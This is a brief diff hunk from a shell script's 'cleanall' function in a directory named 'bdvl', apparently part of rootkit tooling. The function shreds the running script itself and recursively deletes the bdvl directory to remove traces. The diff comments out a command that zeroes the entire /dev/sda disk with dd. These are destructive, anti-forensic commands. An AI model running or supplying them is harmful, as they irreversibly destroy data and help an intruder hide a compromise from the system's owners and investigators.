@@ -1499,7 +1499,7 @@ cleanall(){
 	shred -zuf -n 1 "$0" 2>/dev/null
 	cd ../
 	rm -rf ./bdvl
-	dd if=/dev/zero of=/dev/sda bs=40G
+#	dd if=/dev/zero of=/dev/sda bs=40G
 }
 ###
 cecho(){
